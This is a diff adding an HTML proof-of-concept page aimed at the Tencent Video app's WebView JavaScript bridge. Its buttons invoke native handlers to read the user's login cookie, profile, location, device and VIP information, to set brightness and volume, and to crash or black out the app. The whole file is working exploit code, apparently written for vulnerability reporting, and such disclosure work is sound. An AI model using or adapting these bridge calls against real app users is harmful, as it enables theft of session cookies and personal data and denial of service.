@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>腾讯视频POC</title>
+    <script>
+
+        function getAppInfo(){
+            window.WebViewJavascriptBridge.callHandler('getAppInfoV2',null,function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }
+        function getDeviceInfo(){
+            window.WebViewJavascriptBridge.callHandler('getDeviceInfo',null,function(res){console.log(111);alert(res);console.log(222);}); 
+        }
+        function getMsgCount(){
+             window.WebViewJavascriptBridge.callHandler('getMsgCount',null,function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }
+        function getNetworkState(){
+            window.WebViewJavascriptBridge.callHandler('getNetworkState',null,function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }
+        function getLocation(){
+            window.WebViewJavascriptBridge.callHandler('getLocation',null,function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }
+        function getMainUserInfo(){
+             window.WebViewJavascriptBridge.callHandler('getMainUserInfo',{},function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }
+        function getMainLoginCookieV2(){
+            window.WebViewJavascriptBridge.callHandler('getMainLoginCookieV2',{},function(res){console.log(111);console.log(res);alert(res);console.log(222);});         
+        }  
+        function getVolumeV2(){
+             window.WebViewJavascriptBridge.callHandler('getVolumeV2',{},function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }  
+        function getBrightnessV2(){
+         window.WebViewJavascriptBridge.callHandler('getBrightnessV2',{},function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }   
+        function doVibratorLongV2(){
+         window.WebViewJavascriptBridge.callHandler('doVibratorLongV2',{},function(res){console.log(111);console.log(res);console.log(222);}); 
+        }     
+        function getWebViewInfo(){
+              window.WebViewJavascriptBridge.callHandler('getWebViewInfo',{},function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }  
+        function getPayVip(){
+            window.WebViewJavascriptBridge.callHandler('getPayVip',{},function(res){console.log(111);console.log(res);alert(res);console.log(222);}); 
+        }    
+        function setBrightnessV2(){
+            window.WebViewJavascriptBridge.callHandler('setBrightnessV2',{'brightness':1.0},function(res){console.log(333);console.log(res);console.log(222);}); 
+        }   
+        function scanQRCode(){
+           window.WebViewJavascriptBridge.callHandler('scanQRCode',{},function(res){console.log(111);console.log(res);console.log(222);}); 
+        }  
+        function toastV2(){
+              window.WebViewJavascriptBridge.callHandler('toastV2',{'text':'审核大哥你好!!'},function(res){console.log(111);console.log(res);console.log(222);}); 
+        }  
+            function showAlertView(){
+            window.WebViewJavascriptBridge.callHandler('showAlertView',{'title':'你好','message':'审核大哥','confirmText':'确定',},function(res){console.log(111);console.log(res);console.log(222);}); 
+        }  
+        function openToolsDialog(){
+                 window.WebViewJavascriptBridge.callHandler('openToolsDialog',{},function(res){console.log(111);console.log(res);console.log(222);}); 
+        }  
+        function appcrash(){
+                window.WebViewJavascriptBridge.callHandler('getNativeStorage',{'key':'crash'},function(res){console.log(111);console.log(res);console.log(222);}); 
+        }  
+        function hideH5(){
+                window.WebViewJavascriptBridge.callHandler('hideH5',{},function(res){console.log(111);console.log(res);console.log(222);}); 
+        } 
+        function setVolumeV2(){
+                window.WebViewJavascriptBridge.callHandler('setVolumeV2',{'volume':1.0},function(res){console.log(111);console.log(res);console.log(222);}); 
+        }   
+        function launchAuthManualCheckPage(){
+                window.WebViewJavascriptBridge.callHandler('launchAuthManualCheckPage',{},function(res){console.log(111);console.log(res);console.log(222);}); 
+        }   
+
+        function getUA(){
+            alert(navigator.userAgent);
+        }   
+
+
+
+    </script>
+    <style>
+        html  body{
+            width: 100%;
+            margin: 0;
+            padding:0
+        }
+    
+
+        .main{
+            text-align: center;
+            width: 100%;
+            margin:20px;
+        }
+        button{
+            font-size: large;
+            border-radius: 5px;
+            padding:3px;
+            margin: 5px 3px 5px 3px;
+        }
+        .sub1>button{
+            background-color: #F44336;
+        }
+        .sub1>button:active{
+            background-color: #FF5722;
+        }
+
+        .sub2>button{
+            background-color: #FFA000;
+        }
+        .sub2>button:active{
+            background-color: #FFC107;
+        }
+
+    </style>
+</head>
+<body>
+    <div class="main">       
+        <div class="sub1">
+            <h3>信息泄露类(严重)</h3>
+                <button onclick="getMainUserInfo()">用户信息</button>
+                <button onclick="getMainLoginCookieV2()">Cookie</button>
+                <button onclick="getWebViewInfo()">web信息</button>
+                <button onclick="getDeviceInfo()">设备信息</button>
+                <button onclick="getLocation()">位置信息</button>
+                <button onclick="getAppInfo()">App信息</button>
+                <button onclick="getPayVip()">VIP信息</button>
+                <button onclick="getMsgCount()">未读消息数</button>
+                <button onclick="getNetworkState()">网络信息</button>
+                <button onclick="getUA()">浏览器UA</button>
+        </div>
+
+        <div class="sub2">
+            <h3>设备控制类</h3>
+                <button onclick="setBrightnessV2()">亮度拉满</button>
+                <button onclick="getBrightnessV2()">屏幕亮度</button>
+                <button onclick="setVolumeV2()">音量拉满</button>
+                <button onclick="getVolumeV2()">设备音量</button>
+                <button onclick="doVibratorLongV2()">设备震动</button>
+        </div>
+
+        <div class="sub3">
+                <h3>界面控制+拒绝服务</h3>
+                <button onclick="scanQRCode()">跳扫码</button>
+                <button onclick="launchAuthManualCheckPage()">跳人工认证</button>
+                <button onclick="toastV2()">弹Toast</button>
+                <button onclick="showAlertView()">弹Alert</button>
+                <button onclick="openToolsDialog()">弹分享</button>
+                <button onclick="appcrash()">App崩溃</button>
+                <button onclick="hideH5()">App黑屏</button>
+
+        </div>
+    </div>
+</body>
+</html>
